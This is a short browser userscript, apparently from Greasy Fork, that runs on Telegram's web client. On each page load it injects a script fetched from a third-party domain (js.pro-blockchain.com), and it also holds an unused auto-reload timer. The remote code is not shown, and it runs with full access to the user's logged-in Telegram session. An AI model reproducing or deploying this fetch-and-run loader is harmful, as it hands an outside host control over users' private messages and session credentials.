// ==UserScript==
// @name         Lxgn send  JuJx.io
// @namespace    https://web.telegram.org/
// @version      0.01
// @author       lxgn
// @description  Telega send  JuJx.io
// @match        https://web.telegram.org/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373842/Lxgn%20send%20%20JuJxio.user.js
// @updateURL https://update.greasyfork.org/scripts/373842/Lxgn%20send%20%20JuJxio.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();


var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/telega_send_jujx/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }


function reload()
{
    location.reload();
}
function reload_check_timecounter()
{
	if(skip_reload_timeout)return false;
    reload_timecounter--;
    console.log('AL reload: '+reload_timecounter);
    if(reload_timecounter<=0)reload();
}
var reload_timecounter = 3600;
var skip_reload_timeout = 0;
